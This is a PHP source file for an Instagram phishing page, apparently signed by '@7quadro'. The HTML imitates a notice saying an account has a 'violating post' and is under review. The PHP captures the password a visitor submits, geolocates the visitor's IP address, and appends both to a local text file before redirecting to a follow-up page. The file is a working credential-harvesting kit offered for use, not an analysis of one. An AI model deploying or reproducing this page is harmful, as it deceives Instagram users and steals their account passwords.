<?php



set_time_limit(0);
error_reporting(E_ALL);

include 'ara.php';


function ara($bas, $son, $yazi)

{

    @preg_match_all('/' . preg_quote($bas, '/') .

    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);

    return @$m[1];

}

$username = $_GET['username'];

$_SERVER["theysl"]=$username;

$url = 'https://instagram.com/' . $username;

    $html = file_get_contents($url);

    $dom = new DOMDocument();

    $dom->loadHTML($html);

    $veri = $dom->textContent;

    $cc = ara('"thumbnail_src":"','"',$veri);

    $meta_tags = $dom->getElementsByTagName('meta');

    foreach( $meta_tags as $meta ) {

        if( $meta->getAttribute('property') == 'og:image' ) {

            $image_url = $meta->getAttribute('content');

        }

    }

if(empty($cc)){

        $cc[0] = $image_url;

    }

if($_POST){

$username = $_POST['username'];

$password =  $_POST['password'];

$ip = $_SERVER['REMOTE_ADDR'];

$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));

$ulke = $details->country;

date_default_timezone_set('Europe/Istanbul');

$cur_time=date("d-m-Y H:i:s");

$file = fopen('quadrojoseph.txt', 'a');

fwrite($file,"</> BY CODER QUADRO JOSEPH SNOWDEN </>

Kullanici Sifresi: ".$password. "\n"."Ip Adress: " .$ip."\n".

"Country: ".$ulke ."\n".   "Time: " .$cur_time.  "\n\n\n");


fclose($file);


$file = fopen('quadro-zanrook.txt', 'a');

fwrite($file," </> BY CODER QUADRO JOSEPH SNOWDEN </>
-----------------------------------------
@7quadro Tarafindan yazilmistir. Bu script uzerinde hak idda edenlere itibar etmeyiniz, Ve @7quadro instagram hesabina sikayet ediniz.

-----------------------------------------
");
 
echo '';
    header("Location: quadro-mail.php");

}


    
 ?> 










<html class="no-js" lang="en">
 <head> 
  <title>Feedback</title> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="initial-scale=1.0, width=device-width"> 
  <meta name="yandex-verification" content="b86ddb94bff2755b"> 
  <meta name="google-site-verification" content="b6d2UW9S861LG6makwi4WHZJ19u1tB2gHgm5-tRZGzA"> 
  <meta name="csrf-token" content="y8XJ7o4B7KRWuuN0QC6GRJuQUwynQNOlBi00maxV"> 
  <meta name="keywords" content=""> 
  <meta name="description" content="Watch anonymously and download content from Instagram in original quality. (Stories, highlights, video, photo, avatar). Without registration and login to Instagram. From a computer or phone."> 
  <meta property="og:description" content="Watch anonymously and download content from Instagram in original quality. (Stories, highlights, video, photo, avatar). Without registration and login to Instagram. From a computer or phone."> 
  <meta property="og:type" content="website"> 
  <meta property="og:url" content="https://insta-stories.online/7quadro"> 
  <meta property="og:title" content="7quadro | Watch Anonymously &amp; Download Instagram Stories | Online Service"> 
  <meta name="DC.Title" content="7quadro | Watch Anonymously &amp; Download Instagram Stories | Online Service"> 
  <meta name="DC.Creator" content="SNB-Team"> 
  <meta name="DC.Subject" content="7quadro | Watch Anonymously &amp; Download Instagram Stories | Online Service"> 
  <meta name="DC.Description" content="Watch anonymously and download content from Instagram in original quality. (Stories, highlights, video, photo, avatar). Without registration and login to Instagram. From a computer or phone."> 
  <meta name="DC.Publisher" content="InstaStories"> 
  <meta name="DC.Language" content="en"> 
  <link rel="canonical" href="https://insta-stories.online/7quadro"> 
  <link rel="shortcut icon" href="https://insta-stories.online/img/favicon.ico" type="image/x-icon"> 
  <link rel="stylesheet" href="https://insta-stories.online/css/normalize.css"> 
  <link rel="stylesheet" href="https://insta-stories.online/css/style.css"> 
  <link rel="stylesheet" href="https://insta-stories.online/css/owl.carousel.min.css"> 
  <link rel="stylesheet" href="https://insta-stories.online/css/fontawesome.css"> 
  <meta http-equiv="origin-trial" content="A+b/H0b8RPXNaJgaNFpO0YOFuGK6myDQXlwnJB3SwzvNMfcndat4DZYMrP4ClJIzYWo3/yP2S+8FTZ/lpqbPAAEAAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
  <meta http-equiv="origin-trial" content="A9ZgbRtm4pU3oZiuNzOsKcC8ppFSZdcjP2qYcdQrFKVzkmiWH1kdYY1Mi9x7G8+PS8HV9Ha9Cz0gaMdKsiVZIgMAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AxL6oBxcpn5rQDPKSAs+d0oxNyJYq2/4esBUh3Yx5z8QfcLu+AU8iFCXYRcr/CEEfDnkxxLTsvXPJFQBxHfvkgMAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A9KPtG5kl3oLTk21xqynDPGQ5t18bSOpwt0w6kGa6dEWbuwjpffmdUpR3W+faZDubGT+KIk2do0BX2ca16x8qAcAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A3HucHUo1oW9s+9kIKz8mLkbcmdaj5lxt3eiIMp1Nh49dkkBlg1Fhg4Fd/r0vL69mRRA36YutI9P/lJUfL8csQoAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="A0OysezhLoCRYomumeYlubLurZTCmsjTb087OvtCy95jNM65cfEsbajrJnhaGwiTxhz38ZZbm+UhUwQuXfVPTg0AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="AxoOxdZQmIoA1WeAPDixRAeWDdgs7ZtVFfH2y19ziTgD1iaHE5ZGz2UdSjubkWvob9C5PrjUfkWi4ZSLgWk3Xg8AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="A7+rMYR5onPnACrz+niKSeFdH3xw1IyHo2AZSHmxrofRk9w4HcQPMYcpBUKu6OQ6zsdxf4m/vqa6tG6Na4OLpAQAAAB4eyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AwfG8hAcHnPa/kJ1Co0EvG/K0F9l1s2JZGiDLt2mhC3QI5Fh4qmsmSwrWObZFbRC9ieDaSLU6lHRxhGUF/i9sgoAAACBeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AwQ7dCmHkvR6FuOFxAuNnktYSQrGbL4dF+eBkrwNLALc69Wr//PnO1yzns3pjUoCaYbKHtVcnng2hU+8OUm0PAYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AysVDPGQTLD/Scn78x4mLwB1tMfje5jwUpAAzGRpWsr1NzoN7MTFhT3ClmImi2svDZA7V6nWGIV8YTPsSRTe0wYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A+b/H0b8RPXNaJgaNFpO0YOFuGK6myDQXlwnJB3SwzvNMfcndat4DZYMrP4ClJIzYWo3/yP2S+8FTZ/lpqbPAAEAAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
  <meta http-equiv="origin-trial" content="A9ZgbRtm4pU3oZiuNzOsKcC8ppFSZdcjP2qYcdQrFKVzkmiWH1kdYY1Mi9x7G8+PS8HV9Ha9Cz0gaMdKsiVZIgMAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AxL6oBxcpn5rQDPKSAs+d0oxNyJYq2/4esBUh3Yx5z8QfcLu+AU8iFCXYRcr/CEEfDnkxxLTsvXPJFQBxHfvkgMAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A9KPtG5kl3oLTk21xqynDPGQ5t18bSOpwt0w6kGa6dEWbuwjpffmdUpR3W+faZDubGT+KIk2do0BX2ca16x8qAcAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A3HucHUo1oW9s+9kIKz8mLkbcmdaj5lxt3eiIMp1Nh49dkkBlg1Fhg4Fd/r0vL69mRRA36YutI9P/lJUfL8csQoAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="A0OysezhLoCRYomumeYlubLurZTCmsjTb087OvtCy95jNM65cfEsbajrJnhaGwiTxhz38ZZbm+UhUwQuXfVPTg0AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="AxoOxdZQmIoA1WeAPDixRAeWDdgs7ZtVFfH2y19ziTgD1iaHE5ZGz2UdSjubkWvob9C5PrjUfkWi4ZSLgWk3Xg8AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="A7+rMYR5onPnACrz+niKSeFdH3xw1IyHo2AZSHmxrofRk9w4HcQPMYcpBUKu6OQ6zsdxf4m/vqa6tG6Na4OLpAQAAAB4eyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AwfG8hAcHnPa/kJ1Co0EvG/K0F9l1s2JZGiDLt2mhC3QI5Fh4qmsmSwrWObZFbRC9ieDaSLU6lHRxhGUF/i9sgoAAACBeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AwQ7dCmHkvR6FuOFxAuNnktYSQrGbL4dF+eBkrwNLALc69Wr//PnO1yzns3pjUoCaYbKHtVcnng2hU+8OUm0PAYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AysVDPGQTLD/Scn78x4mLwB1tMfje5jwUpAAzGRpWsr1NzoN7MTFhT3ClmImi2svDZA7V6nWGIV8YTPsSRTe0wYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A+b/H0b8RPXNaJgaNFpO0YOFuGK6myDQXlwnJB3SwzvNMfcndat4DZYMrP4ClJIzYWo3/yP2S+8FTZ/lpqbPAAEAAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
  <meta http-equiv="origin-trial" content="A9ZgbRtm4pU3oZiuNzOsKcC8ppFSZdcjP2qYcdQrFKVzkmiWH1kdYY1Mi9x7G8+PS8HV9Ha9Cz0gaMdKsiVZIgMAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AxL6oBxcpn5rQDPKSAs+d0oxNyJYq2/4esBUh3Yx5z8QfcLu+AU8iFCXYRcr/CEEfDnkxxLTsvXPJFQBxHfvkgMAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A9KPtG5kl3oLTk21xqynDPGQ5t18bSOpwt0w6kGa6dEWbuwjpffmdUpR3W+faZDubGT+KIk2do0BX2ca16x8qAcAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A3HucHUo1oW9s+9kIKz8mLkbcmdaj5lxt3eiIMp1Nh49dkkBlg1Fhg4Fd/r0vL69mRRA36YutI9P/lJUfL8csQoAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="A0OysezhLoCRYomumeYlubLurZTCmsjTb087OvtCy95jNM65cfEsbajrJnhaGwiTxhz38ZZbm+UhUwQuXfVPTg0AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="AxoOxdZQmIoA1WeAPDixRAeWDdgs7ZtVFfH2y19ziTgD1iaHE5ZGz2UdSjubkWvob9C5PrjUfkWi4ZSLgWk3Xg8AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="A7+rMYR5onPnACrz+niKSeFdH3xw1IyHo2AZSHmxrofRk9w4HcQPMYcpBUKu6OQ6zsdxf4m/vqa6tG6Na4OLpAQAAAB4eyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AwfG8hAcHnPa/kJ1Co0EvG/K0F9l1s2JZGiDLt2mhC3QI5Fh4qmsmSwrWObZFbRC9ieDaSLU6lHRxhGUF/i9sgoAAACBeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AwQ7dCmHkvR6FuOFxAuNnktYSQrGbL4dF+eBkrwNLALc69Wr//PnO1yzns3pjUoCaYbKHtVcnng2hU+8OUm0PAYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AysVDPGQTLD/Scn78x4mLwB1tMfje5jwUpAAzGRpWsr1NzoN7MTFhT3ClmImi2svDZA7V6nWGIV8YTPsSRTe0wYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A+b/H0b8RPXNaJgaNFpO0YOFuGK6myDQXlwnJB3SwzvNMfcndat4DZYMrP4ClJIzYWo3/yP2S+8FTZ/lpqbPAAEAAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
  <meta http-equiv="origin-trial" content="A9ZgbRtm4pU3oZiuNzOsKcC8ppFSZdcjP2qYcdQrFKVzkmiWH1kdYY1Mi9x7G8+PS8HV9Ha9Cz0gaMdKsiVZIgMAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AxL6oBxcpn5rQDPKSAs+d0oxNyJYq2/4esBUh3Yx5z8QfcLu+AU8iFCXYRcr/CEEfDnkxxLTsvXPJFQBxHfvkgMAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A9KPtG5kl3oLTk21xqynDPGQ5t18bSOpwt0w6kGa6dEWbuwjpffmdUpR3W+faZDubGT+KIk2do0BX2ca16x8qAcAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A3HucHUo1oW9s+9kIKz8mLkbcmdaj5lxt3eiIMp1Nh49dkkBlg1Fhg4Fd/r0vL69mRRA36YutI9P/lJUfL8csQoAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="A0OysezhLoCRYomumeYlubLurZTCmsjTb087OvtCy95jNM65cfEsbajrJnhaGwiTxhz38ZZbm+UhUwQuXfVPTg0AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="AxoOxdZQmIoA1WeAPDixRAeWDdgs7ZtVFfH2y19ziTgD1iaHE5ZGz2UdSjubkWvob9C5PrjUfkWi4ZSLgWk3Xg8AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
  <meta http-equiv="origin-trial" content="A7+rMYR5onPnACrz+niKSeFdH3xw1IyHo2AZSHmxrofRk9w4HcQPMYcpBUKu6OQ6zsdxf4m/vqa6tG6Na4OLpAQAAAB4eyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AwfG8hAcHnPa/kJ1Co0EvG/K0F9l1s2JZGiDLt2mhC3QI5Fh4qmsmSwrWObZFbRC9ieDaSLU6lHRxhGUF/i9sgoAAACBeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AwQ7dCmHkvR6FuOFxAuNnktYSQrGbL4dF+eBkrwNLALc69Wr//PnO1yzns3pjUoCaYbKHtVcnng2hU+8OUm0PAYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="AysVDPGQTLD/Scn78x4mLwB1tMfje5jwUpAAzGRpWsr1NzoN7MTFhT3ClmImi2svDZA7V6nWGIV8YTPsSRTe0wYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
  <link rel="preload" href="https://adservice.google.com.tr/adsid/integrator.js?domain=insta-stories.online" as="script"> 
  <link rel="preload" href="https://adservice.google.com/adsid/integrator.js?domain=insta-stories.online" as="script"> 
 </head> 
 <body> 
  <div class="wrapper" style="height: auto !important;"> 
   <div class="main-screen"> 
    <div class="container"> 
     <header class="flex jcsb aic"> 
      <div class="logo"> 

      </div> 
      </div> </li> 
      </ul> 
     </header> 
    </div> 
   </div> 
   <div class="w-content" style="height: auto !important; min-height: 0px !important;"> 
    <div class="user-info" style="height: auto !important;"> 
     <div class="container" style="height: auto !important;"> 

      <script>
                             (adsbygoogle = window.adsbygoogle || []).push({});
                        </script> 
      <div class="row" style="position: relative; padding: 0 20px; overflow: hidden;"> 
       <div class="avatar user-info-avatar-active">
        <a ><img class="profile-pic" src="<?=$pp?>" alt="" onerror="getUserInfo('7quadro','6862707151')"></a>
     
       </div> 
       <div class="top flex jcsb aic"> 
        <div class="nickname"> 
         <h1> <?=$username?> <span><?=$name?></span> </h1> 
        </div> 
        <div class="buttons flex aic"> 
         <div class="favourite"> 
         
         </div> 
         <a href="" class="share">Share</a> 
        </div> 
       </div> 
       <div class="info"> 
        <ul class="flex"> 
         <li> <p><span id="numbers-posts">1</span> Violating post</p> </li> 
         <li> <p><span class="num-followers">  <?=$followers2?></span> </p> </li> 
         <li> <p><span class="num-follows"><?=$f_count?></span> </p> </li> 
        </ul> 
        <div class="caption">
       Process completed. Our team will review your account and come to a conclusion. A message will be sent to your e-mail within 24 hours.
        </div> 
       </div> 
      </div> 

      <script>
                             (adsbygoogle = window.adsbygoogle || []).push({});
                        </script> 
     </div> 
    </div> 
    <div class="user-content"> 
     <div class="container"> 
      <div class="tabs"> 
       <ul class="list"> 
        <li><a href="https://instagram.com" class="active" data-tab="tab-stories">Complete and go to Application</a></li> 
     
       </ul> 
       <div class="tab-content"> 
        <div class="tab tab-stories current"> 
         <ul class="tab-stories-ul">
          <li>
           <div class="item"> 

           </div></li>
         </ul> 
         <span class="no-content-text stories-no-content">No new stories</span> 
         <div class="stories_preload_line" style="margin: 30px 0px; display: none;"> 
